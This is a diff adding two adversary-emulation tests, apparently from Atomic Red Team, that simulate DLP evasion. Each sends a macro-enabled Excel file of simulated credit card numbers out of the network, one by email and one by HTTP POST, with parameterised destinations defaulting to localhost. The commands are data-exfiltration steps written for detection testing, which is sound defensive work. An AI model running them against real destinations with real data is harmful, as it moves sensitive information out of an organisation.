@@ -101,3 +101,52 @@ atomic_tests:
       del /Q "%temp%\T1027.zip" >nul 2>nul
     name: command_prompt
 
+- name: DLP Evasion via Sensitive Data in VBA Macro over email
+  description: |
+    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
+    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file: 
+      description: Path of the XLSM file
+      type: path
+      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+    sender:
+      description: sender email
+      type: string
+      default: test@corp.com
+    receiver:
+      description: receiver email
+      type: string
+      default: test@corp.com
+    smtp_server:
+      description: SMTP Server IP Address
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: powershell
+  executor:
+    command: |
+      "Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1027 Atomic Test" -Attachments PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm -SmtpServer #{smtp_server}"
+    name: powershell
+
+- name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
+  description: |
+    Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.
+    Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.
+  supported_platforms:
+  - windows
+  input_arguments:
+    input_file: 
+      description: Path of the XLSM file
+      type: path
+      default: PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+    ip_address:
+      description: Destination IP address
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: powershell
+  executor:
+    command: |
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+    name: powershell
